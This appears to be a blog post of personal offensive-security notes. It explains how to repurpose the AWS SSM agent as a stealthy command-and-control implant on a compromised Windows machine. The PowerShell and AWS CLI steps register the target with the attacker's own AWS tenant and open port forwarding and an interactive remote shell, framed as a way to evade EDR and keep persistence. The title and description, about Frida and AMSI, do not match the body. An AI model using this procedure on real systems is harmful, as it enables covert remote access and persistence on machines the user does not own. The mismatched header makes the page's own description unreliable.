---
title: Frida vs. AMSI
description: Let's use Frida to explore all the different ways we can patch or break the Anti-Malware Scan Interface.
date: 2025-05-28
permalink: /blogs/aws-ssm-c2
---

# Using Amazon SSM as a C2 implant (Windows)

From my personal notes. 

Communication with the AWS API is often ignored by EDR, and the SSM agent is a legitimate utility that has a business use case in many environments. Using standard enterprise tooling instead of signature C2 frameworks is a great way to maintain stealthy persistence in a heavily monitored environment.

Step 1: Clone from [https://github.com/aws/amazon-ssm-agent](https://github.com/aws/amazon-ssm-agent) and build for Windows.  
Step 2: Transfer all binaries from appropriate release folder to target machine. Put them in `C:\Program Files\Amazon\SSM\` as a local administrator.  
Step 3: Log into the AWS console for your own tenant. Navigate to Systems Manager, and from there to *Hybrid Activations*.  
Step 4: Create a new hybrid activation. Record the activation code and ID.  

Step 5: If required, set proxy information on the target machine:

```powershell
set http_proxy=http://hostname:port
set https_proxy=http://hostname:port
```

Step 6: Using a local administrator account, register the target machine with AWS:

```powershell
.\amazon-ssm-agent.exe -region "<region>" -id "<activation id>" -code "<activation code>" -register
```

Step 7: Invoke the agent as a local administrator:

```powershell
.\amazon-ssm-agent.exe
```

You can now invoke run documents remotely on the machine as long as the agent is running. For example, to set up port forwarding:

```sh
aws ssm start-session --target <instance-id> --document-name AWS-StartPortForwardingSession --parameters '{"portNumber":["80"],"localPortNumber":["9999"]}'
```

If you want to use the interactive session manager shell (Windows Server only), go to [https://github.com/rprichard/winpty/](https://github.com/rprichard/winpty/) and download the latest release. Then transfer `winpty.dll` and `winpty-agent.exe` to:

- `C:\Program Files\Amazon\SSM\Plugins\SessionManagerShell\`
